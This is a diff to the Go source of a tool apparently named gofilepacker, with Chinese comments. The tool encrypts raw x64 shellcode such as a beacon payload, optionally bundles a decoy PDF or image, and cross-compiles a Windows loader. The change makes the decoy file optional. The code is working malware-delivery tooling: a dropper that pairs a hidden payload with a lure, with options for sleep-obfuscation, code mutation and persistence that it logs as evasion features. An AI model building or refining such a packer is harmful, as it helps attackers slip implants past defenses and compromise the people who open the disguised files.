@@ -8,13 +8,14 @@ import (
 	"crypto/rand"
 	"encoding/base64"
 	"flag"
-	"gofilepacker/internal/keymgr"
 	"io"
 	"log"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"text/template"
+
+	"gofilepacker/internal/keymgr"
 )
 
 const logo = `
@@ -551,13 +552,13 @@ type TemplateData struct {
 
 func encryptAESGCM(plaintext []byte, key []byte, enableCompress bool) (string, error) {
 	data := plaintext
-	
+
 	// XOR加密层 (使用AES密钥前8字节)
 	xorKey := key[:8]
 	for i := range data {
 		data[i] ^= xorKey[i%8]
 	}
-	
+
 	// 如果启用压缩，先压缩数据
 	if enableCompress {
 		var compressedBuf bytes.Buffer
@@ -570,7 +571,7 @@ func encryptAESGCM(plaintext []byte, key []byte, enableCompress bool) (string, e
 		}
 		data = compressedBuf.Bytes()
 	}
-	
+
 	block, err := aes.NewCipher(key)
 	if err != nil {
 		return "", err
@@ -591,7 +592,7 @@ func main() {
 	log.SetFlags(0)
 	log.Println(logo)
 
-	decoyFile := flag.String("decoy", "", "Required: Path to the decoy file (e.g., a PDF or image).")
+	decoyFile := flag.String("decoy", "", "Optional: Path to the decoy file (e.g., a PDF or image).")
 	payloadFile := flag.String("payload", "", "Required: Path to the raw x64 shellcode file (e.g., beacon.bin).")
 	outputFile := flag.String("out", "", "Required: Final output executable name.")
 	enableObfuscate := flag.Bool("obfuscate", false, "Optional: Enable sleep-obfuscation in generated loader.")
@@ -599,32 +600,43 @@ func main() {
 	enableCompress := flag.Bool("compress", true, "Optional: Enable zlib compression of embedded data (default: true).")
 	flag.Parse()
 
-	if *decoyFile == "" || *payloadFile == "" || *outputFile == "" {
-		log.Println("\nError: All -decoy, -payload, and -out flags are required.")
-		log.Println("Usage:")
+	// 只强制校验 payload 与 out
+	if *payloadFile == "" || *outputFile == "" {
+		log.Println("\nError: -payload and -out flags are required.")
 		flag.PrintDefaults()
 		os.Exit(1)
 	}
 
-	decoyBytes, err := os.ReadFile(*decoyFile)
-	if err != nil {
-		log.Fatalf("[-] Failed to read decoy file: %v", err)
-	}
-	shellcodeBytes, err := os.ReadFile(*payloadFile)
-	if err != nil {
-		log.Fatalf("[-] Failed to read payload file: %v", err)
-	}
-
+	/* ======  把 key 推导提前  ====== */
 	log.Println("[+] Deriving AES-256 key using Argon2id...")
 	aesKey, salt, err := keymgr.DeriveKeyAndSalt()
 	if err != nil {
 		log.Fatalf("[-] Failed to derive key and salt: %v", err)
 	}
 
-	log.Println("[+] Encrypting decoy file with derived key...")
-	encryptedDecoy, err := encryptAESGCM(decoyBytes, aesKey, *enableCompress)
+	var (
+		encryptedDecoy string
+		decoyFileName  string
+	)
+
+	// 如果提供了诱饵文件再读取、加密
+	if *decoyFile != "" {
+		decoyBytes, err := os.ReadFile(*decoyFile)
+		if err != nil {
+			log.Fatalf("[-] Failed to read decoy file: %v", err)
+		}
+		log.Println("[+] Encrypting decoy file with derived key...")
+		encryptedDecoy, err = encryptAESGCM(decoyBytes, aesKey, *enableCompress)
+		if err != nil {
+			log.Fatalf("[-] Failed to encrypt decoy file: %v", err)
+		}
+		decoyFileName = filepath.Base(*decoyFile)
+	}
+
+	// 读取 shellcode（必填）
+	shellcodeBytes, err := os.ReadFile(*payloadFile)
 	if err != nil {
-		log.Fatalf("[-] Failed to encrypt decoy file: %v", err)
+		log.Fatalf("[-] Failed to read payload file: %v", err)
 	}
 
 	log.Println("[+] Encrypting payload file with the same derived key...")
@@ -635,9 +647,9 @@ func main() {
 
 	data := TemplateData{
 		EncryptedPayload: encryptedShellcode,
-		EncryptedDecoy:   encryptedDecoy,
+		EncryptedDecoy:   encryptedDecoy, // 空值时模板会跳过诱饵逻辑
 		Salt:             base64.StdEncoding.EncodeToString(salt),
-		DecoyFileName:    filepath.Base(*decoyFile),
+		DecoyFileName:    decoyFileName, // 空值时模板里 decoyFileName = ""
 		EnableObfuscate:  *enableObfuscate,
 		EnableMutate:     *enableMutate,
 		EnableCompress:   *enableCompress,
@@ -668,7 +680,7 @@ func main() {
 	}
 
 	log.Printf("[+] Cross-compiling for windows/amd64 to %s...", *outputFile)
-	
+
 	// 显示启用的功能
 	var features []string
 	if *enableCompress {
@@ -680,10 +692,10 @@ func main() {
 	if *enableMutate {
 		features = append(features, "Code Mutation")
 	}
-	
+
 	// 添加稳定性提示
 	features = append(features, "Stable Persistence Mode")
-	
+
 	if len(features) > 0 {
 		log.Printf("[+] Enabled evasion features: %v", features)
 	}
